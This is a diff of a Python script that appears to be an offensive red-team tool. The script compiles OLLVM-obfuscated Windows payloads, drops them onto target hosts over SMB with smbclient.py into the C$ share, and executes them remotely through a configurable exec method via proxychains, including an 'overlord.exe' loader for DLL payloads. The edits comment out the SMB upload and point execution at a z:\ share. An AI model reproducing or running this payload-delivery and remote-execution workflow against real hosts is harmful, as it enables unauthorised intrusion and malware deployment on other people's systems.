@@ -134,8 +134,9 @@ def main():
         file=f"ollvm/x86_64-pc-windows-gnu/{mode}/{args.bin}.{file_format}"
     filename=os.path.basename(file)
     filename_target=f"{args.bin}-{uuid.uuid4().hex}.{file_format}"
-    file_target=f"/tmp/{filename_target}"
-
+    #file_target=f"/tmp/{filename_target}"
+    file_target=f"/home/user/shared/{filename_target}"
+    
 
     compilation_args=f"{bin_comm} {log_level} {features_visible} {memory_options} {features_loader} {dll_options}"
 
@@ -215,9 +216,11 @@ NOT ACTIVATED:
 
         if not args.no_drop:
             if args.verbose:
-                log.info(f'[+] upload file via SMB into: {exec_target}')
+                #log.info(f'[+] upload file via SMB into: {exec_target}')
+                pass
             else:
-                log.info(f'[+] upload file via SMB into target')
+                #log.info(f'[+] upload file via SMB into target')
+                pass
             upload_comm=f'''
 {proxychains}smbclient.py "{exec_target}" <<EOF
 use C$
@@ -227,17 +230,17 @@ ls {filename_target}
 exit
 EOF
 '''
-            os.system(upload_comm)
+            #os.system(upload_comm)
 
             if not args.no_exec:
                 if not args.dll :
-                    log.info(f'[+] exec c:\\{filename_target} with {args.exec_method}')
-                    exec_comm=f"{proxychains}{args.exec_method} {exec_target} c:\\\\{filename_target}"
+                    log.info(f'[+] exec z:\\{filename_target} with {args.exec_method}')
+                    exec_comm=f"{proxychains}{args.exec_method} {exec_target} z:\\\\{filename_target}"
                     log.debug(exec_comm)
                     os.system(exec_comm)
                 else:
-                    log.info(f'[+] exec c:\\overlord.exe to load and run Overlord entrypoint of c:\\{filename_target} with {args.exec_method}')
-                    exec_comm=f"{proxychains}{args.exec_method} {exec_target} c:\\\\overlord.exe"
+                    log.info(f'[+] exec z:\\overlord.exe to load and run Overlord entrypoint of z:\\{filename_target} with {args.exec_method}')
+                    exec_comm=f"{proxychains}{args.exec_method} {exec_target} z:\\\\overlord.exe"
                     log.debug(exec_comm)
                     os.system(exec_comm)
             else:
